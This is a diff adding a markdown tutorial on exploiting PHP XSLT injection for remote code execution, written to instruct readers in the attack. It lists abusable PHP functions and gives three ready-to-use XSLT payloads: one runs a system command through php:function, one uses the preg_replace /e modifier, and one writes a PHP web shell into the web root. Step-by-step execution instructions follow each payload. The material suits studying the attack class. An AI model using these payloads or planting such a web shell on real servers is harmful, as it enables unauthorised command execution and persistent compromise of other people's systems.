@@ -1,0 +1,111 @@
+---
+title: Remote Code Execution with PHP Wrapper Techniques
+description: Learn to exploit PHP XSLT injection vulnerabilities for remote code execution
+  using PHP wrappers and functions.
+keywords:
+- PHP remote code execution
+- XSLT injection
+- php:function
+- PHP wrappers
+- code execution
+- web security
+- cybersecurity
+- exploitation techniques
+- PHP vulnerability
+- shell_exec XSLT
+---
+
+# Remote Code Execution with PHP Wrapper
+
+## Context 
+
+This article aims to instruct readers on how to exploit XSLT injection vulnerabilities within PHP environments to achieve remote code execution using PHP-specific wrappers and functions. It is assumed that the reader understands how XSLT processors function within web applications, has knowledge of PHP stream wrappers, grasps the concepts of remote code execution, and is familiar with basic XSLT injection techniques.
+
+## Theory
+
+### PHP XSLT Processor and Wrapper Integration
+
+PHP's XSL extension supports XSLT transformations, which enables the use of certain PHP functions directly from XSLT stylesheets. This is achieved through the `php:function` wrapper, which can significantly increase the attack surface if not properly managed.
+
+If user-supplied XSLT is processed without careful restrictions, attackers can invoke PHP functions that may cause harm, making this a potent vulnerability model.
+
+### Abusable PHP Functions in XSLT Context
+
+PHP functions such as `system`, `shell_exec`, `assert`, `include`, `file_put_contents`, and `preg_replace` can be executed within the context of XSLT by using the `php:function` wrapper. 
+
+The basic attack sequence involves injecting XSLT that references `php:function` and provides attacker-controlled arguments to execute arbitrary code. Some applications attempt to restrict use by blacklisting certain functions, but attackers often bypass these restrictions by chaining less obvious functions, such as using `preg_replace` with the `/e` modifier for execution.
+
+### Payload Construction for PHP Wrapper RCE
+
+Payloads designed for PHP wrapper RCE need to be valid XSLT that call `php:function` using the correct namespace and function signature. The attack sequence involves defining the `php:function` namespace and calling the desired PHP function with the necessary input from the attacker.
+
+## Practice
+
+### Remote Code Execution via php:function in XSLT
+
+To launch a Remote Code Execution attack using `php:function`, follow these steps:
+
+- **Payload:**
+
+    ```xml
+    <?xml version="1.0"?>
+    <xsl:stylesheet version="1.0"
+      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+      xmlns:php="http://php.net/xsl">
+      <xsl:template match="/">
+        <xsl:value-of select="php:function('system','id')"/>
+      </xsl:template>
+    </xsl:stylesheet>
+    ```
+    This payload utilizes the PHP `system()` function to execute the command `id`.
+
+- **Execution:**
+  - Submit this XSLT payload to the vulnerable endpoint that processes XSLT input.
+  - Observe the output from the command execution to confirm success, such as the user identity.
+
+### Remote Code Execution via preg_replace /e Modifier
+
+Utilizing the deprecated `preg_replace` with the `/e` modifier can also lead to remote code execution:
+
+- **Payload:**
+
+    ```xml
+    <?xml version="1.0"?>
+    <xsl:stylesheet version="1.0"
+      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+      xmlns:php="http://php.net/xsl">
+      <xsl:template match="/">
+        <xsl:value-of select="php:function('preg_replace','/(.*)/e','system(\'id\')','test')"/>
+      </xsl:template>
+    </xsl:stylesheet>
+    ```
+
+- **Execution:**
+  - Send this payload to the XSLT processing endpoint.
+  - Check the response for execution results to determine if the attack was successful.
+
+### File Write via file_put_contents for Web Shell Deployment
+
+This method involves writing a PHP web shell to the server using `file_put_contents`:
+
+- **Payload:**
+
+    ```xml
+    <?xml version="1.0"?>
+    <xsl:stylesheet version="1.0"
+      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+      xmlns:php="http://php.net/xsl">
+      <xsl:template match="/">
+        <xsl:value-of select="php:function('file_put_contents','/var/www/html/shell.php','<?php system($_GET[\'cmd\']); ?>')"/>
+      </xsl:template>
+    </xsl:stylesheet>
+    ```
+
+- **Execution:**
+  - Deploy the payload to the endpoint.
+  - Access the newly-created web shell via the browser. Use the `cmd` parameter to execute commands.
+
+## Tools
+
+- **curl**
+- **Burp Suite**
